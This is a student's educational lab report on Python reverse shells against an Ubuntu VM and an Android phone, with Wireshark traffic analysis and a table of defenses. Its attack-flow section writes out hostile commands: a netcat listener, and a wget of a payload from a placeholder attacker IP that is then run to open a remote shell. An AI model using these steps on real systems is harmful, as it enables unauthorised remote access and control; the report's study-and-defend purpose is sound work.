# Technical Report
## Malware Development and Remote Access — Educational Lab

**Student Name:** Mahrukh  
**Environment:** Controlled & Isolated Lab Setup  
**Date:** January 2026

---

## Abstract

This report presents an educational malware development lab conducted in a controlled and isolated environment. The purpose was to understand how reverse shell payloads function on Linux and Android systems, and how such activities can be monitored and analyzed from a **defensive perspective**.

Kali Linux served as the attacker machine. Ubuntu Linux and a physical Android device acted as victim systems. Python scripts were developed to establish reverse shell connections. Wireshark was used to analyze the network traffic generated during the simulations.

> The lab was performed strictly for academic learning and cyber defense understanding.

---

## 1. Lab Environment Setup

The environment was designed to ensure complete isolation and safety. Oracle VirtualBox was used as the virtualization platform.

### 1.1 Kali Linux (Attacker Machine)

| Property | Value |
|---|---|
| **Role** | Listener and command execution system |
| **Network Mode (Ubuntu test)** | Host-Only Adapter |
| **Network Mode (Android test)** | Bridged Adapter |
| **Tools Used** | Netcat, Wireshark, Python 3 |

### 1.2 Ubuntu Linux (Victim Machine)

| Property | Value |
|---|---|
| **Role** | Linux victim system |
| **Network Mode** | Host-Only Adapter |
| **Purpose** | Execute Python reverse shell, establish session with Kali |

### 1.3 Android Device (Victim)

| Property | Value |
|---|---|
| **Device** | Samsung Smartphone |
| **Android Version** | Android 15 |
| **Network Mode** | Bridged Adapter (same LAN as Kali) |
| **Runtime** | Termux (Python environment) |
| **Purpose** | Execute Python reverse shell, connect back to Kali |

---

## 2. Network Configuration

Two distinct network configurations were used depending on the victim system:

**Host-Only Network (Ubuntu ↔ Kali)**
- Completely isolated from the external internet
- Both machines on the `192.168.56.0/24` subnet
- Kali: `192.168.56.102` | Ubuntu: `192.168.56.103`

**Bridged Network (Android ↔ Kali)**
- Both devices on the same local network
- Enabled communication between the physical phone and the VM
- Kali: `192.168.0.106` | Android: `192.168.0.101`

This dual configuration allowed controlled testing while maintaining flexibility for Android connectivity.

---

## 3. Design Architecture

The lab architecture consisted of three main components:

```
┌─────────────────────────────────────────────────────┐
│                  LAB ARCHITECTURE                   │
│                                                     │
│  ┌──────────────┐    TCP Port 4444    ┌───────────┐ │
│  │  Kali Linux  │◄────────────────────│  Ubuntu   │ │
│  │  (Attacker)  │                     │  (Victim) │ │
│  │              │◄──────────────────  └───────────┘ │
│  │  - Netcat    │    TCP Port 4444                  │
│  │  - Wireshark │                    ┌───────────┐  │
│  │  - Python    │◄───────────────────│  Android  │  │
│  └──────────────┘                    │  (Victim) │  │
│         │                            └───────────┘  │
│         ▼                                           │
│    [Wireshark]                                      │
│    Traffic Analysis                                 │
└─────────────────────────────────────────────────────┘
```

**Key Design Decisions:**
- Host-Only networking for Ubuntu ensured zero internet exposure
- Bridged networking for Android allowed realistic mobile device simulation
- Port 4444 was used consistently as the reverse shell listener port
- All traffic was captured in real-time via Wireshark on the eth0 interface

---

## 4. Code Explanation

The reverse shell programs were written in **Python 3** using the `socket` and `subprocess` standard libraries.

### Core Mechanism

```
Victim Script Logic:
1. Create TCP socket
2. Connect to attacker IP:PORT
3. Enter command loop:
   a. Receive command from attacker
   b. Execute via subprocess
   c. Send output back to attacker
   d. Log execution locally
4. Close on "exit" command
```

### Ubuntu Script Features
- TCP socket connection to Kali (`192.168.56.102:4444`)
- Command execution via `subprocess.getoutput()`
- Local command logging to `command_log.txt` for forensic analysis
- Clean exit on "exit" command

### Android Script Additional Features
- Device fingerprinting (model + Android version via `getprop`)
- Heartbeat messages every 10 seconds (`[HB] Android Termux alive`)
- Timestamped connection logging to `/data/data/com.termux/files/home/connection_log.txt`
- Exception handling with error logging
- Graceful session termination on "exit" or "quit"

> Scripts were kept intentionally simple and non-destructive to comply with ethical and academic guidelines.

---

## 5. Attack Flow

```
Step 1: Attacker configures Netcat listener
        $ nc -lvnp 4444
        → Listening on [any] 4444 ...

Step 2: Attacker hosts payload via HTTP server
        $ python3 -m http.server 8080

Step 3: Victim downloads payload
        $ wget http://[KALI_IP]:8080/payload.py

Step 4: Victim executes payload
        $ python3 payload.py

Step 5: Outbound TCP connection established
        → Victim initiates connection to Kali:4444
        → Bypasses inbound firewall rules

Step 6: Interactive session begins
        → Attacker sends commands
        → Victim executes and returns output

Step 7: Network traffic captured by Wireshark
        → Filter: tcp.port == 4444
        → PSH/ACK packets visible
```

### Why Reverse Shells Bypass Firewalls

Traditional firewalls block **inbound** connections. A reverse shell has the **victim initiate the outbound connection**, making it appear as normal outgoing traffic. This is a fundamental concept in understanding why perimeter defenses alone are insufficient.

---

## 6. Results

### Ubuntu Session
- ✅ Reverse shell session successfully established
- ✅ Remote commands (`whoami`, `ls`) executed and output received
- ✅ TCP traffic on port 4444 captured in Wireshark
- ✅ Command log written locally on Ubuntu

### Android Session
- ✅ Termux environment configured successfully
- ✅ Device info (Model: SM-A145F, Android 15) transmitted to Kali
- ✅ Heartbeat messages received on Kali
- ✅ Remote commands executed via Termux
- ✅ TCP traffic on port 4444 captured in Wireshark

---

## 7. Wireshark Analysis

Wireshark was used to monitor and confirm reverse shell traffic in real-time.

**Capture Filter Applied:** `tcp.port == 4444`

**Observations:**
- TCP three-way handshake visible between victim and attacker IPs
- PSH/ACK packets carried command data and output
- Communication was **unencrypted plaintext** — all commands and outputs were visible in the packet payload
- This demonstrates the need for encrypted C2 channels in real attacks (and detection opportunities for defenders)

**Defensive Insight:** Unencrypted reverse shells are easily detectable by monitoring tools. Any IDS/IPS configured to inspect port 4444 traffic would immediately flag this activity.

---

## 8. Defense Strategies

| Defense Layer | Strategy | Tool/Technique |
|---|---|---|
| **Network** | Monitor unusual outbound TCP connections | Firewall logs, SIEM |
| **Network** | Egress filtering on non-standard ports | Firewall ACLs |
| **Detection** | Intrusion Detection System | Snort, Suricata |
| **Endpoint** | Detect suspicious process spawning | EDR (CrowdStrike, Defender) |
| **Application** | Whitelisting — restrict executable scripts | AppArmor, SELinux |
| **Logging** | Analyze command execution logs | Syslog, auditd |
| **Monitoring** | Real-time traffic inspection | Wireshark, Zeek |
| **Mobile** | Restrict Termux/sideloading on managed devices | MDM policies |

---

## 9. Ethical Considerations

This experiment was conducted strictly for educational purposes within a controlled lab environment.

- ✅ All systems used were personally owned by the student
- ✅ No external networks or real users were involved
- ✅ Scripts were non-destructive
- ✅ Lab was fully air-gapped from the internet (Ubuntu setup)
- ✅ Results are used only for academic documentation and defensive awareness

---

## 10. Conclusion

This lab successfully demonstrated:

1. How Python-based reverse shell payloads are constructed and deployed
2. How Netcat can be used as a simple TCP listener for receiving shell connections
3. How reverse shells bypass inbound firewall rules via outbound connections
4. How Wireshark captures and reveals unencrypted reverse shell traffic
5. The differences between Linux and Android environments for payload execution

By understanding attacker techniques hands-on, cybersecurity students gain practical insight that informs better defensive design. This lab reinforces the principle that **knowing how attacks work is fundamental to defending against them**.

---

*Report prepared for academic submission. All activities conducted in an isolated, ethical lab environment.*
